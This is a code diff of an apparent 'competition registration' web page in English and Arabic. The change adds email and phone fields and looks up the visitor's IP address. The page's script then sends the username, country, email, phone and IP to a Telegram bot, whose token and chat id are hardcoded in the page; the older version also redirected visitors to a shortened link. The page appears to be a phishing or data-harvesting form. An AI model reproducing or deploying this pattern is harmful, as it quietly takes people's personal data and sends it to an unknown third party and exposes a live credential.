@@ -70,6 +70,8 @@
     <p id="mainText">Please enter your information to join the event:</p>
 
     <input type="text" id="username" placeholder="Your HR username">
+    <input type="text" id="email" placeholder="Email Address">
+    <input type="text" id="phone" placeholder="Phone Number">
 
     <select id="country">
       <option value="" disabled selected>🌍 Select Country</option>
@@ -106,26 +108,60 @@
       <option value="🇦🇺 Australia">🇦🇺 Australia</option>
     </select>
 
-
-    <button onclick="sendToTelegram()">Submit</button>
+    <button onclick="checkAndSend()">Submit</button>
     <p id="statusMsg"></p>
   </div>
 
   <script>
-    function sendToTelegram() {
+    document.addEventListener('DOMContentLoaded', () => {
+      const registeredIP = localStorage.getItem('registered_ip');
+      if (registeredIP) {
+        document.getElementById('statusMsg').textContent = '✅ You have already registered!';
+        document.getElementById('statusMsg').style.color = 'lightgreen';
+        document.querySelector('button').disabled = true; // Disable the submit button
+      }
+    });
+
+    async function getIpAddress() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        console.error('Error fetching IP:', error);
+        return 'N/A';
+      }
+    }
+
+    async function checkAndSend() {
+      const registeredIP = localStorage.getItem('registered_ip');
+      if (registeredIP) {
+        const status = document.getElementById('statusMsg');
+        status.textContent = '✅ You have already registered!';
+        status.style.color = 'lightgreen';
+        return;
+      }
+      sendToTelegram();
+    }
+
+    async function sendToTelegram() {
       const username = document.getElementById('username').value.trim();
       const country = document.getElementById('country').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const phone = document.getElementById('phone').value.trim();
       const status = document.getElementById('statusMsg');
 
-      if (!username || !country ) {
+      if (!username || !country || !email || !phone) {
         status.textContent = 'Please fill in all required fields!';
         status.style.color = 'orange';
         return;
       }
 
+      const ip = await getIpAddress();
+
       const token = '6456489010:AAHxWt_1iqbOk7yWiU76djvQMMXToLcmEuU';
       const chat_id = 5830998075;
-      const message = `🎯 Competition Entry:\n\n👤 Username: ${username}\n🌍 Country: ${country}`;
+      const message = `🎯 Competition Entry:\n\n👤 Username: ${username}\n🌍 Country: ${country}\n📧 Email: ${email}\n📞 Phone: ${phone}\n🌐 IP Address: ${ip}`;
 
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
@@ -140,11 +176,10 @@
       .then(response => response.json())
       .then(data => {
         if (data.ok) {
-          status.textContent = '✅ You have successfully registered! Redirecting...';
+          localStorage.setItem('registered_ip', ip);
+          status.textContent = '✅ You have successfully registered!';
           status.style.color = 'lightgreen';
-          setTimeout(() => {
-            window.location.href = 'https://smrturl.co/10f0574';
-          }, 3000);
+          document.querySelector('button').disabled = true;
         } else {
           status.textContent = `❌ Failed to send. Error: ${data.description}`;
           status.style.color = 'red';
@@ -162,12 +197,12 @@
 
       document.getElementById('mainTitle').textContent = isEnglish ? ' تسجيل في المسابقة' : ' Competition Registration';
       document.getElementById('mainText').textContent = isEnglish ? 'يرجى إدخال معلوماتك للمشاركة:' : 'Please enter your information to join the event:';
-      document.getElementById('username').placeholder = isEnglish ? 'اسمك داخل العبة ' : 'Your HR username';
+      document.getElementById('username').placeholder = isEnglish ? 'اسم المستخدم HR الخاص بك' : 'Your HR username';
+      document.getElementById('email').placeholder = isEnglish ? 'البريد الإلكتروني' : 'Email Address';
+      document.getElementById('phone').placeholder = isEnglish ? 'رقم الهاتف' : 'Phone Number';
       document.querySelector("button").textContent = isEnglish ? 'إرسال' : 'Submit';
       document.getElementById('langToggle').textContent = isEnglish ? 'EN' : 'AR';
     }
   </script>
 </body>
 </html>
-
-
